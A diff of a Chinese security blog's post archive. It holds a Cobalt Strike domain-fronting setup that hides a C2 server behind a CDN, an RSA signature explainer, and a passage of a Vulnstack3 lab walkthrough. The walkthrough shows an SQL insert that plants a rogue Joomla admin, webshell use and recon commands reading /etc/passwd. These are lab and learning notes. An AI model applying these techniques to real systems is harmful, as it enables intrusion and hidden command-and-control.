+    <content><![CDATA[<h2 id="什么是域前置"><a href="#什么是域前置" class="headerlink" title="什么是域前置"></a>什么是域前置</h2><p>Domain Fronting，中文译名 “域前置” 或 “域名前置”，是一种用于隐藏真实C2(Command and Control)服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。</p>
+<p>利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信</p>
+<h2 id="其他知识–域名解析记录类型"><a href="#其他知识–域名解析记录类型" class="headerlink" title="其他知识–域名解析记录类型"></a>其他知识–域名解析记录类型</h2><p>1、A (Address) 记录<br>是用来指定<a href="https://so.csdn.net/so/search?q=%E4%B8%BB%E6%9C%BA%E5%90%8D&spm=1001.2101.3001.7020">主机名</a>（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的二级域名。</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/b387c7e7abb08c5c048d3a6e807cb9f6.png" alt="img"></p>
+<p>2、别名(CNAME)记录<br>也被称为规范名字。这种记录允许您将多个名字映射到同一台计算机。 通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为“host.mydomain.com”（A记录）。 它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。 这两个别名的全称就是“<a href="http://www.mydomain.com”和“mail.mydomain.com”.实际上他们都指向“host.mydomain.com”./">www.mydomain.com”和“mail.mydomain.com”。实际上他们都指向“host.mydomain.com”。</a></p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/1efd3987e07018e881857b4561bc87ee.png" alt="img"></p>
+<p>3、MX（Mail Exchanger）记录<br>是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据 收信人的地址后缀来定位邮件服务器。例如，当Internet上的某用户要发一封信给 <a href="mailto:&#x75;&#115;&#101;&#x72;&#x40;&#122;&#x68;&#x6f;&#x6e;&#x67;&#x6a;&#105;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#x75;&#115;&#101;&#x72;&#x40;&#122;&#x68;&#x6f;&#x6e;&#x67;&#x6a;&#105;&#x65;&#x2e;&#x63;&#111;&#x6d;</a> 时，该用户的邮件系统通过DNS查找zhongjie.com这个域名的MX记录，如果MX记录存在， 用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/6cc3e66a493470c669a38c15a8a9343d.png" alt="img"></p>
+<p>4、TXT记录<br>TXT记录一般指为某个主机名或域名设置的说明，如：<br>1）admin IN TXT “jack, mobile:13800138000”；<br>2）mail IN TXT “邮件主机, 存放在xxx ,管理人：AAA”，Jim IN TXT “contact: <a href="mailto:&#97;&#98;&#x63;&#64;&#x6d;&#97;&#105;&#x6c;&#x73;&#101;&#x72;&#118;&#101;&#x72;&#46;&#x63;&#111;&#x6d;">&#97;&#98;&#x63;&#64;&#x6d;&#97;&#105;&#x6c;&#x73;&#101;&#x72;&#118;&#101;&#x72;&#46;&#x63;&#111;&#x6d;</a>“也就是您可以设置 TXT ，以便使别人联系到您。</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/9b56f3771ee8c12a6c4b9e1ab7c8e08a.png" alt="img"></p>
+<p>5、NS记录<br>ns记录全称为Name Server 是一种域名服务器记录，用来明确当前你的域名是由哪个DNS服务器来进行解析的。这里的NS记录只对子域名生效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>Windows Server 2008 R2: 192.168.184.132（NAT）</p>
+<p>域名：wcl078.shiyan078</p>
+<p>用户名：administrator</p>
+<p>密码：123456@abc</p>
+<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509095907956.png" alt="image-20220509095907956"></p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509095956218.png" alt="image-20220509095956218"></p>
+<p>继续安装AD配置域名为wcl078.shiyan078</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509100037635.png" alt="image-20220509100037635"></p>
+<p>创建一个域用户wcl078，密码使123456@abc</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002.jpg" alt="img"></p>
+<h3 id="域成员服务器"><a href="#域成员服务器" class="headerlink" title="域成员服务器"></a>域成员服务器</h3><p>Windows7: 192.168.184.153（NAT）</p>
+<p>域名：wcl078.shiyan078</p>
+<p>用户名：wcl078</p>
+<p>密码：123456@abc</p>
+<h3 id="CS服务端"><a href="#CS服务端" class="headerlink" title="CS服务端"></a>CS服务端</h3><p>Ubuntu:（公网ip）</p>
+<p>安装jdk8</p>
+<p>apt install openjdk-8-jre-headless</p>
+<h3 id="CS客户端"><a href="#CS客户端" class="headerlink" title="CS客户端"></a>CS客户端</h3><p>kali: 192.168.3.78 (桥接模式，不能是NAT，不然之后用wireshark抓取流量的时候会抓到CS客户端与服务端通信的流量，因为wireshark抓的是网卡的流量，别问我为什么知道QAQ)</p>
+<p>更换JDK</p>
+<p>由于我的kali自带jdk11需要更换为jdk8</p>
+<p>访问<a href="https://www.oracle.com/java/technologies/downloads/#java8%EF%BC%8C%E4%B8%8B%E8%BD%BDjdk8">https://www.oracle.com/java/technologies/downloads/#java8，下载jdk8</a></p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652061818255.jpg" alt="img"></p>
+<p>下载后将该压缩包放到kali虚拟机中，执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压压缩包</span></span><br><span class="line">tar zxvf jdk-8u331-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解压后的文件移动到/opt目录下</span></span><br><span class="line">mv ./jdk1.8.0_251/ /opt/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后使用update-alternatives命令进行安装</span></span><br><span class="line">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_331/bin/java 1</span><br><span class="line"></span><br><span class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_331/bin/javac 1</span><br><span class="line"></span><br><span class="line">update-alternatives --<span class="built_in">set</span> java /opt/jdk1.8.0_331/bin/java</span><br><span class="line"></span><br><span class="line">update-alternatives --<span class="built_in">set</span> javac /opt/jdk1.8.0_331/bin/javac</span><br></pre></td></tr></table></figure>
+
+<p>最后使用<code>java -version</code>查看版本，更换成功</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652062807196.jpg" alt="img"></p>
+<p>补充：若之后想切换回jdk11，执行<code>update-alternatives --config java</code>来选择切换</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652062821709.jpg" alt="img"></p>
+<h2 id="CS实现域前置"><a href="#CS实现域前置" class="headerlink" title="CS实现域前置"></a>CS实现域前置</h2><p>需要一个域名和CND，这里我是在某云注册的域名和CDN</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065755641.jpg" alt="img"></p>
+<p>这里使用站长之家的多地ping来看CDN是否生效<a href="http://ping.chinaz.com/%EF%BC%8C%E6%9C%89%E4%B8%8D%E5%90%8Cip%E5%8D%B3%E5%8F%AF">http://ping.chinaz.com/，有不同ip即可</a></p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065770486.jpg" alt="img"></p>
+<p>服务端cs在运行时需要加一个.profile文件，我是基于<a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile">amazon.profile</a>文件的基础上改了两个地方，将Host改为我的域名</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065963543.jpg" alt="img"></p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065967848.jpg" alt="img"></p>
+<p>改好后重新运行teamserver，<code>/teamserver vpsip mima amazon.profile</code></p>
+<p>之后kali客户端连接，配置监听器</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image001.png" alt="img"></p>
+<p>再利用cs生成攻击命令</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066019120.jpg" alt="img"></p>
+<p>然后在受害主机win7的cmd中执行刚刚生成攻击命令,之后CS上线</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066172741.jpg" alt="img"></p>
+<p>在weblog中查看结果如下</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066202884.jpg" alt="img"></p>
+<p>在受害主机win7上使用wireshark抓包分析，过滤出ip为vpsip的，发现并没有流量，说明域前置隐藏成功</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066215882.jpg" alt="img"></p>
+<p>还可以在cmd中执行netstat查看建立的连接，并不是和我的vps建立的，也能说明CDN生效了</p>
+<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066228717.jpg" alt="img"></p>
+<p>到此域前置到此部署完毕</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/276159.html">域前置攻击复现</a></p>
+<p><a href="https://www.anquanke.com/post/id/195011">基于国内某云的 Domain Fronting 技术实践</a></p>
+<p><a href="https://blog.csdn.net/qq_43968080/article/details/105586109">Kali重新安装JAVA环境</a></p>
+<p><a href="https://blog.csdn.net/userpass_word/article/details/103838606">Kali中安装Java环境</a></p>
+<h2 id="拓展了解"><a href="#拓展了解" class="headerlink" title="拓展了解"></a>拓展了解</h2><p><a href="https://www.freebuf.com/articles/web/271046.html">域前置之“中外差异”</a></p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>域前置技术</tag>
+        <tag>Cobaltstrike</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RSA数字签名 及 数字证书 原理</title>
+    <url>/2023/08/27/RSA%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%20%E5%8F%8A%20%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%20%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<blockquote>
+<p>在学习安卓逆向过程中，修改了apk文件后遇到有”签名不一致”不能直接安装的情况，就去B站回顾了一下数字签名原理以及数字证书的不可伪造性，下文便是这次学习的一个小记录📝</p>
+<p>免得之后忘了又要重新看一遍视频QAQ</p>
+</blockquote>
+<h2 id="RSA数字签名"><a href="#RSA数字签名" class="headerlink" title="RSA数字签名"></a>RSA数字签名</h2><p>RSA算法可以总结为四句话：<strong>公钥加密、私钥解密、私钥签名、公钥验签</strong>。加密是防止信息泄露，而签名是为了防止信息被篡改。</p>
+<p>RSA数字签名场景如下图</p>
+<p><img src="/2023/08/27/RSA%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%20%E5%8F%8A%20%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%20%E5%8E%9F%E7%90%86/image-20230827143636630.png" alt="image-20230827143636630"></p>
+<ol>
+<li><p><strong>生成密钥对</strong>：小明利用RSA算法生成公钥和私钥。</p>
+<p>生成公钥和私钥过程如下：</p>
+<ul>
+<li>选择两个大质数 p 和 q，计算 n = p * q，然后计算欧拉函数 φ(n) = (p-1)(q-1)。接下来，选择一个整数 e，使得 e 和 φ(n) 互质。最后，计算出 d，使得 e * d ≡ 1 (mod φ(n))。公钥为 (e, n)，私钥为 (d, n)</li>
+</ul>
+</li>
+<li><p><strong>生成消息摘要</strong>：在对文件进行签名前，要先对文件进行hash处理，生成固定长度的消息摘要H</p>
+</li>
+<li><p><strong>对消息摘要进行签名</strong>：使用私钥(d, n)对消息进行签名。H^d mod n≡S，至此完成了对文件的数字签名</p>
+<p><img src="/2023/08/27/RSA%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%20%E5%8F%8A%20%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%20%E5%8E%9F%E7%90%86/image-20230827145846494.png" alt="image-20230827145846494"></p>
+</li>
+<li><p><strong>发布</strong>：将公钥(e, n)、文件、数字签名S，发布到互联网</p>
+</li>
+<li><p><strong>验证签名</strong>：小红使用公钥(e, n)对签名S进行验证运算S^e mod n≡H’，将结果与文件的hash进行对比。若文件没有被篡改，则对比结果一致，签名有效；若文件被篡改，则对比结果不一致，签名无效。</p>
+<p><img src="/2023/08/27/RSA%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%20%E5%8F%8A%20%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%20%E5%8E%9F%E7%90%86/image-20230827151150519.png" alt="image-20230827151150519"></p>
+</li>
+</ol>
+<p>上述流程是在确保公钥、文件、数字签名等信息都是由小明所提供的前提下，即文件是由小明签署的。但往往有不怀好意的人，他可以自己生成密钥对，将修改后带有恶意内容的文件进行签名，并发送到互联网。这时小红获取到坏人所提供的公钥、文件、数字签名用于验证，结果会显示签名是有效的，但真实情况却是小红得到的是一份被篡改过的文件。</p>
+<p><img src="/2023/08/27/RSA%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%20%E5%8F%8A%20%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%20%E5%8E%9F%E7%90%86/image-20230827152635803.png" alt="image-20230827152635803"></p>
+<p>那么如何确保该文件是由小明本人签署的呢？</p>
+<p>那就需要下文讲到的<strong>数字证书</strong>技术来解决了</p>
+<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>上述RSA签名算法中主要的问题是公钥的可信问题，不能证明公钥是属于小明的，利用数字证书就能解决公钥的<strong>可信问题</strong>。</p>
+<p>数字证书获取流程：</p>
+<ol>
+<li>小明将公钥即部分个人身份信息发送给某个<strong>权威</strong>公正的证书颁发（Certificate Authority简称<strong>CA</strong>）机构</li>
+<li>CA机构核实小明身份后，将颁发一个数字证书，该证书包含小明的身份信息和其公钥数据</li>
+</ol>
+<p>小明将得到的数字证书和签名放在文件中一并发布到互联网，这样小红就能放心使用证书中的公钥来验证签名了。若坏人将文件（例如apk）内容进行改变，重新签名发给小红，小红利用已有小明的可信公钥（小红之前安装了小明的文件，有小明的证书）验证时便会失败，即签名无效。</p>
+<p><img src="/2023/08/27/RSA%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%20%E5%8F%8A%20%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%20%E5%8E%9F%E7%90%86/image-20230827172947204.png" alt="image-20230827172947204"></p>
+<h3 id="数字证书的不可伪造性"><a href="#数字证书的不可伪造性" class="headerlink" title="数字证书的不可伪造性"></a>数字证书的不可伪造性</h3><p>到这里我们还会有一个问题，为什么数字证书就能信任了呢，数字证书不会被伪造吗？</p>
+<p>答案是不会，<strong>数字证书不会被伪造</strong>。</p>
+<p>为什么？因为数字证书是经过CA机构数字签名的，CA机构自己也有一套公钥私钥，用私钥对小明身份信息及其公钥数据进行数字签名，并放在数字证书中。</p>
+<p>用户如何验证CA签署的数字签名呢？用户的电脑或手机系统里都<strong>预先</strong>默认安装了<strong>根证书</strong>（杜绝CA机构公钥被伪造的可能），根证书里记录了可以信赖的CA机构信息及其公钥。通过CA机构公钥就可以验证数字证书里的数字签名，从而确保了数字证书的不可伪造性。</p>
+<p><img src="/2023/08/27/RSA%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%20%E5%8F%8A%20%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%20%E5%8E%9F%E7%90%86/image-20230827173554583.png" alt="image-20230827173554583"></p>
+<p>这样一来，坏人无法将文件中的证书进行伪造，也就是说坏人的公钥无法得到小红的信任。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>数字签名</strong>的主要目的是为了验证apk文件的<strong>完整性</strong>。它通过使用开发者的私钥对apk文件进行签名，然后使用相应的公钥进行验证。这样，系统就可以确保apk文件没有被篡改，并且来自可靠的来源。</p>
+<p><strong>数字证书</strong>则包含了开发者的公钥和其他元数据，确定来源的<strong>可靠性</strong>。</p>
+<h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a href="https://www.bilibili.com/video/BV18N411X7ty/?share_source=copy_web&vd_source=9d03ed98df829cbab30eb582ecaece90">数字签名 及 数字证书 原理</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NTgwODEzMg==&mid=2257483913&idx=1&sn=7dd7b3911049007c02c21473e39b7d84&chksm=a5880e6292ff877487a11c921a6ca52d7a2323a32bf2a19a8c72abcc5f42277acc7bf6bd9816&scene=178&cur_album_id=2238939281962745859#rd">RSA算法公钥、私钥及数字签名加密流程分步解析</a></p>
+]]></content>
+      <categories>
+        <category>数字签名</category>
+      </categories>
+      <tags>
+        <tag>数字签名</tag>
+        <tag>数字证书</tag>
+        <tag>RSA</tag>
       </tags>
   </entry>
   <entry>
@@ -300,6 +846,218 @@
 <p>参考：<a href="https://github.com/k8gege/Aggressor/issues/5">https://github.com/k8gege/Aggressor/issues/5</a></p>
 <h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://pan.baidu.com/s/13nU-0vsGBnGejGCKzwphfQ&shfl=sharepset">ATT&amp;CK红队评估实战靶场二</a>    下载密码：<strong>41y6</strong></p>
 <p><a href="https://github.com/k8gege/Aggressor/releases/tag/cs">https://github.com/k8gege/Aggressor/releases/tag/cs</a>  下拉到最下面，有cs的下载地址</p>
+]]></content>
+      <categories>
+        <category>内网安全</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>内网安全，vulnstack</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnstack3靶场内网渗透</title>
+    <url>/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>需要添加一张192.168.93.0/24网段的内网网卡</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230940156.png" alt="image-20220715230940156"></p>
+<p>若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选</p>
+<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715231439922.png" alt="image-20220715231439922"></p>
+<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p>先用nmap进行探针<code>nmap 192.168.184.0/24</code></p>
+<p>探测到在192.168.184.137地址开有web服务</p>
+<p>访问如下，发现是Joomla的CMS</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710114851003.png" alt="image-20220710114851003"></p>
+<p>利用msf的<code>auxiliary/scanner/http/joomla_version</code>模块探测Joomla版本，发现是3.9.12版本的</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115045397.png" alt="image-20220710115045397"></p>
+<p>这就有点棘手了，因为版本很新，网上都是3.4、3.5之类的漏洞，看来是没法直接用，于是去找登录点看看有没有弱口令</p>
+<p>有两处登录点，一个是前台<code>http://192.168.184.137/index.php/author-login</code></p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115400615.png" alt="image-20220710115400615"></p>
+<p>另一个是后台<code>http://192.168.184.137/administrator/index.php</code>（robots.txt中找到的路径）</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115413169.png" alt="image-20220710115413169"></p>
+<p>但是都不存在弱口令，呜呜😭</p>
+<p>没辙了等着爆破密码，摆烂了一会儿</p>
+<p>这个靶场是和小伙伴一起打的，在我摆烂的时候，小伙伴用dirsearch扫了一下目录，扫出来了一个<code>configuration.php~</code>文件，里面有mysql数据库用户名和密码<code>testuser/cvcvgjASD!@</code>，我直呼牛B！！（害，懒了一下没去扫目录，不能懒啊！）</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710120843966.png" alt="image-20220710120843966"></p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710120915806.png" alt="image-20220710120915806"></p>
+<p>直接用Navicat登录成功，查看<code>umnbt_users</code>表，获得用户名密码<code>admin/$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy</code></p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710121138968.png" alt="image-20220710121138968"></p>
+<p>这里密码加了密，没办法直接用，去somd5也没有解出来，提示此密文无法识别，真·脑阔疼，又无从下手了</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710121340132.png" alt="image-20220710121340132"></p>
+<p>这里我想用mysql直接写shell，但是查了文章说需要root权限，完了没辙了，开摆！</p>
+<p>这里实在是不会，就去看了一眼攻略，可以自行添加用户进行登录</p>
+<p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710203030913.png" alt="image-20220710203030913"></p>
+<p>所以这里payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小坑，我之前找的_users表没找对，<code>umnbt_users</code>不是后台登录的校验表，<code>am2zu_users</code>才是，我之间对着umnbt_users表一顿输出，一直登陆不上，后来才发现表弄错了，真的是烦！</p>
+<p>然后终于用admin2/secret登录上了后台</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710203534264.png" alt="image-20220710203534264"></p>
+<p>用冰蝎连shell发现disable_fuction把命令执行函数都给禁用了，然后采用哥斯拉的bypass命令执行成功</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710213724093.png" alt="image-20220710213724093"></p>
+<p>接下来可以利用如下命令做信息收集</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">uname -a    # 获取所有版本信息</span><br><span class="line">uname -m    # 获取Linux内核架构</span><br><span class="line">cat /proc/version    # 获取内核信息 </span><br><span class="line">cat /etc/*-release   # 发布信息</span><br><span class="line">cat /etc/issue    # 发布信息</span><br><span class="line">hostname    # 获取主机名</span><br><span class="line"></span><br><span class="line">cat /etc/passwd    # 列出系统所有用户 </span><br><span class="line">cat /etc/group    # 列出系统所有组 </span><br><span class="line">w    # 查看目前登录的用户</span><br><span class="line">whoami    # 查看当前用户 </span><br><span class="line">id    # 查看当前用户信息 </span><br><span class="line">sudo -l    # 列出目前用户可执行与无法执行的指令 </span><br><span class="line"></span><br><span class="line">ps <span class="built_in">aux</span>    # 查看进程信息 </span><br><span class="line">ls -la /etc/cron*    # 查看计划任务</span><br><span class="line">ifconfig -a    # 列出网络接口信息 </span><br><span class="line">cat /etc/network/interfaces    # 列出网络接口信息 </span><br><span class="line">arp -a    # 查看系统arp表 </span><br><span class="line">route    # 打印路由信息</span><br><span class="line">netstat -anplt    # 打印本地端口开放信息 </span><br><span class="line">iptables -L    # 列出iptable的配置规则</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里遇到一个奇怪的地方，当执行ifconfig查看网卡的时候没有之前192.168.184.137这个ip，出现了一个没见过的ip地址192.168.93.120，但我并没有93这个网段的网卡应该是到不了的</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711174311528.png" alt="image-20220711174311528"></p>
+<p>这里着实不理解，就去网上看wp了</p>
+<p>原来，之前的184.137这台主机并不是真正的web服务器，93.100这台才是，这里是93.100这台web服务器利用184.137这台服务器做了反向代理，在后续渗透查看配置文件的时候也能证明。</p>
+<p>网上查找资料说这样做反向代理的目的可以<strong>隐藏服务端真实ip</strong>，另外还说<strong>反向代理可以实现负载均衡</strong></p>
+<p>之后根据wp的提示在/tmp/mysql/test.txt中发现了一组用户名密码：wwwuser/wwwuser_123Aqx，猜测应该就是192.168.184.137这台主机ssh的用户和密码。</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711204558737.png" alt="image-20220711204558737"></p>
+<p>尝试ssh登录成功，ifconfig查看网卡有192.168.184.137和192.168.93.100这两个ip</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711180345893.png" alt="image-20220711180345893"></p>
+<p>并且在/etc/nginx/nginx.conf文件中查到如下信息，也证明了之前的说法（93.100这台web服务器利用184.137这台服务器做了反向代理）</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711204938381.png" alt="image-20220711204938381"></p>
+<p>接下来就是搭代理打内网，看网上文章都在用脏牛提权，我感觉没必要提权也能打内网</p>
